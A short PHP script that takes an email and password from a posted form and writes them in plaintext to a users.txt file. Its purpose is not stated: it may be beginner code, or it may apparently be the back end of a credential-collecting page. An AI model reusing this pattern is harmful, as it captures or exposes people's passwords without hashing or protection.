<?php

$email=$_POST['email'];
$password=$_POST['password'];
// echo $email."<br>".$password;
$file=fopen("users.txt","w") or die("Unable to open file!");
$str=$email."<br>".$password;
fwrite($file,$str);
fclose($file);
?>
